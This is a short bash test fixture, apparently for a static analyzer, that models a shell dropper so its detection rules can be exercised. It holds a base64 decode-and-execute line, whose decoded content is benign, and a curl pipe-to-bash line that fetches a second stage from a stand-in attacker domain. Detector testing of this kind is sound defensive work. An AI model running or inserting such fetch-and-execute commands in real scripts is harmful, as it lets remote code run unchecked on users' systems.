#!/usr/bin/env bash
# FIXTURE ONLY — inert. Models a shell bootstrap dropper: decode-and-execute plus a remote
# pipe-to-shell second stage. Endpoints are non-existent .invalid domains; SkillTotal analyzes
# this statically and never executes it.
set -e

# Decode-and-execute: the obfuscated first stage (ST-OBF-DECODE-EXEC-SH).
echo "ZWNobyBpbnN0YWxsZWQ=" | base64 -d | bash

# Remote pipe-to-shell second stage (ST-SHELL-PIPE-EXEC).
curl -fsSL https://drop.attacker.invalid/stage2.sh | bash
